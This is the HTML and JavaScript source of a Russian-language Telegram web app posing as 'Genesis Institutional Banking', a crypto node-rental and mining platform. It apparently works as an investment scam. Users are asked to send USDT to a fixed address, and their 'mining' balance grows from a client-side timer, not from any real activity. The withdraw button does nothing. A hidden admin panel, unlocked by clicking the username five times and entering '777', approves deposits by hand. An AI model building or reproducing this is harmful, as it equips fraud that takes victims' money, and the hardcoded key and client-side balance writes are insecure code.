<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Genesis Institutional Banking</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        body { background: #0b0f1a; color: #f8fafc; font-family: 'Inter', sans-serif; overflow-x: hidden; -webkit-user-select: none; }
        .glass { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.08); }
        .tab-content { display: none; min-height: 80vh; }
        .active { display: block; animation: slideUp 0.3s ease-out; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        
        .node-container { position: relative; width: 150px; height: 150px; margin: 0 auto; }
        .node-core { position: absolute; inset: 25%; background: radial-gradient(circle, #3b82f6, #1d4ed8); border-radius: 50%; box-shadow: 0 0 30px #3b82f6; animation: pulse 2s infinite; }
        .node-ring { position: absolute; inset: 0; border: 2px solid rgba(59, 130, 246, 0.2); border-radius: 50%; border-top-color: #3b82f6; animation: spin 3s linear infinite; }
        @keyframes pulse { 0%, 100% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.1); opacity: 1; } }
        @keyframes spin { to { transform: rotate(360deg); } }

        .nav-btn { color: #64748b; transition: 0.3s; display: flex; flex-direction: column; align-items: center; gap: 4px; }
        .nav-btn.active-nav { color: #3b82f6; }
        
        #payment-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 100; align-items: center; justify-content: center; padding: 20px; }
    </style>
</head>
<body class="pb-24">

    <div id="payment-modal">
        <div class="glass p-8 rounded-[32px] w-full max-width-[400px] text-center shadow-2xl">
            <h3 class="text-xl font-bold mb-2">Активация узла</h3>
            <p id="modal-node-name" class="text-xs text-blue-400 mb-6 uppercase font-bold tracking-widest">Node</p>
            <div class="bg-black/40 p-4 rounded-xl border border-white/5 mb-6 text-left">
                <p class="text-[10px] text-slate-500 uppercase mb-2">Адрес USDT TRC-20</p>
                <code class="text-[10px] text-slate-300 break-all">T9zB1287asdqwe55621XczXcv99YtRwQ</code>
                <p class="text-[9px] text-orange-400 mt-2">Минимально: <span id="min-amount">$1000</span></p>
            </div>
            <button onclick="simulatePayment()" id="pay-btn" class="w-full py-4 rounded-xl bg-blue-600 font-bold text-sm">Проверить транзакцию</button>
            <button onclick="closeModal()" class="mt-4 text-xs text-slate-500 uppercase font-bold">Отмена</button>
        </div>
    </div>

    <header class="p-6 flex justify-between items-center border-b border-white/5">
        <div>
            <h1 class="text-xs font-black tracking-[0.3em] text-blue-500 uppercase">Genesis</h1>
            <p id="user-name" class="text-[10px] text-slate-500 italic cursor-pointer">Загрузка протоколов...</p>
        </div>
        <div class="text-right">
            <p class="text-[9px] text-slate-500 uppercase">Система</p>
            <p class="text-xs font-bold text-emerald-400">ONLINE</p>
        </div>
    </header>

    <section id="dashboard" class="tab-content active p-6">
        <div class="node-container mb-8"><div class="node-ring"></div><div class="node-core"></div></div>
        <div class="text-center mb-8">
            <p class="text-[10px] text-slate-400 uppercase tracking-widest mb-1">Доступный баланс</p>
            <h2 id="main-balance" class="text-5xl font-bold tracking-tighter">$...</h2>
        </div>
        <div class="grid grid-cols-2 gap-4">
            <div class="glass rounded-2xl p-4 text-center">
                <p class="text-[9px] text-slate-500 uppercase mb-1">Хэшрейт</p>
                <p id="hashrate-val" class="text-lg font-bold">0.0 TH/s</p>
            </div>
            <div class="glass rounded-2xl p-4 text-center">
                <p class="text-[9px] text-slate-500 uppercase mb-1">Доходность</p>
                <p class="text-lg font-bold text-emerald-400">~1.14%</p>
            </div>
        </div>
    </section>

    <section id="infrastructure" class="tab-content p-6">
        <h3 class="text-xl font-bold mb-6">Marketplace</h3>
        <div class="space-y-4">
            <div class="glass rounded-[24px] p-6 border-l-4 border-blue-500">
                <h4 class="font-bold">Mainnet Node</h4>
                <p class="text-2xl font-bold mb-4">$1,000</p>
                <button onclick="openModal('Mainnet Node', '$1,000')" class="w-full py-3 rounded-xl bg-blue-600 font-bold text-xs uppercase">Арендовать</button>
            </div>
            <div class="glass rounded-[24px] p-6 border-l-4 border-amber-500">
                <h4 class="font-bold text-amber-500">Quantum Engine</h4>
                <p class="text-2xl font-bold mb-4">$50,000</p>
                <button onclick="openModal('Quantum Engine', '$50,000')" class="w-full py-3 rounded-xl bg-amber-600 text-black font-bold text-xs uppercase">Активировать</button>
            </div>
        </div>
    </section>

    <section id="vault" class="tab-content p-6">
        <div class="glass rounded-[32px] p-8 text-center">
            <p class="text-[10px] text-slate-500 uppercase mb-2">Vault Balance</p>
            <h2 class="text-4xl font-bold mb-8">$0.00</h2>
            <button class="w-full py-4 bg-white text-black font-bold rounded-2xl text-[10px] uppercase">Withdraw Funds</button>
        </div>
    </section>

    <nav class="fixed bottom-0 left-0 right-0 h-20 glass border-t border-white/10 flex justify-around items-center z-50">
        <button onclick="nav('dashboard')" class="nav-btn active-nav"><span class="text-[9px] uppercase font-bold">Home</span></button>
        <button onclick="nav('infrastructure')" class="nav-btn"><span class="text-[9px] uppercase font-bold">Nodes</span></button>
        <button onclick="nav('vault')" class="nav-btn"><span class="text-[9px] uppercase font-bold">Vault</span></button>
    </nav>

    <script>
        const SUPABASE_URL = 'https://buvkhgfgrzmimsmyznpm.supabase.co';
        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJ1dmtoZ2ZncnptaW1zbXl6bnBtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzAyNDU3NjEsImV4cCI6MjA4NTgyMTc2MX0.g_ZvbjVu0wlUwDnE3KyRNb2cO69Oq6QHZnUD4hK4yHQ';
        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

        const tg = window.Telegram.WebApp;
        tg.expand();

        let currentBalance = 0;
        let currentUser = null;
        let adminClicks = 0;

        async function init() {
            try {
                const user = tg.initDataUnsafe?.user || { id: 12345, username: 'test_user' };
                document.getElementById('user-name').innerText = 'ID: @' + (user.username || user.id);

                let { data: profile, error } = await supabase.from('profiles').select('*').eq('id', user.id).single();

                if (!profile || error) {
                    const { data: newUser } = await supabase.from('profiles').insert([
                        { id: user.id, username: user.username || 'user_'+user.id, balance: 0, hashrate: 0 }
                    ]).select().single();
                    profile = newUser;
                }

                currentUser = profile;
                currentBalance = parseFloat(profile.balance || 0);
                document.getElementById('hashrate-val').innerText = (profile.hashrate || 0) + ' TH/s';
                
                updateDisplay();
                startMining();
            } catch (e) {
                document.getElementById('user-name').innerText = "Ошибка сети";
            }
        }

        function updateDisplay() {
            document.getElementById('main-balance').innerText = '$' + currentBalance.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
        }

        function startMining() {
            setInterval(() => {
                if (currentBalance > 0) {
                    currentBalance += 0.01;
                    updateDisplay();
                    if (Math.random() > 0.9) saveBalance();
                }
            }, 3000);
        }

        async function saveBalance() {
            if (currentUser) {
                await supabase.from('profiles').update({ balance: currentBalance }).eq('id', currentUser.id);
            }
        }

        // АДМИНКА
        document.getElementById('user-name').addEventListener('click', () => {
            adminClicks++;
            if (adminClicks >= 5) {
                adminClicks = 0;
                const p = prompt("Key:");
                if (p === "777") showAdmin();
            }
        });

        async function showAdmin() {
            const { data: deps } = await supabase.from('deposits').select('*, profiles(username)').eq('status', 'pending');
            let h = `<div id="adm" style="position:fixed;inset:0;background:#0b0f1a;z-index:999;padding:20px;overflow:auto;">
                <h2 class="font-bold mb-4">Pending</h2>
                <button onclick="document.getElementById('adm').remove()" class="text-red-500 mb-4">[X] CLOSE</button>`;
            deps?.forEach(d => {
                h += `<div class="glass p-4 mb-2 rounded-xl text-xs">
                    User: @${d.profiles?.username} | ${d.amount}<br>
                    <button onclick="approve('${d.id}','${d.user_id}','${d.amount}')" class="bg-blue-600 p-2 rounded mt-2">APPROVE</button>
                </div>`;
            });
            document.body.insertAdjacentHTML('beforeend', h + '</div>');
        }

        async function approve(did, uid, amt) {
            const val = parseFloat(amt.replace('$','').replace(',',''));
            const { data: p } = await supabase.from('profiles').select('balance').eq('id', uid).single();
            await supabase.from('profiles').update({ balance: parseFloat(p.balance) + val }).eq('id', uid);
            await supabase.from('deposits').update({ status: 'completed' }).eq('id', did);
            alert("Confirmed!");
            document.getElementById('adm').remove();
            showAdmin();
        }

        // КНОПКИ
        function nav(id) {
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active-nav'));
            document.getElementById(id).classList.add('active');
            event.currentTarget.classList.add('active-nav');
        }

        function openModal(n, p) {
            document.getElementById('modal-node-name').innerText = n;
            document.getElementById('min-amount').innerText = p;
            document.getElementById('payment-modal').style.display = 'flex';
        }
        function closeModal() { document.getElementById('payment-modal').style.display = 'none'; }

        async function simulatePayment() {
            const b = document.getElementById('pay-btn');
            b.innerText = 'Checking...';
            await supabase.from('deposits').insert([{ 
                user_id: currentUser.id, 
                amount: document.getElementById('min-amount').innerText, 
                tier_name: document.getElementById('modal-node-name').innerText 
            }]);
            setTimeout(() => {
                tg.showAlert('Заявка отправлена. Ожидайте подтверждения.');
                b.innerText = 'Проверить транзакцию';
                closeModal();
            }, 1000);
        }

        init();
    </script>
</body>
</html>
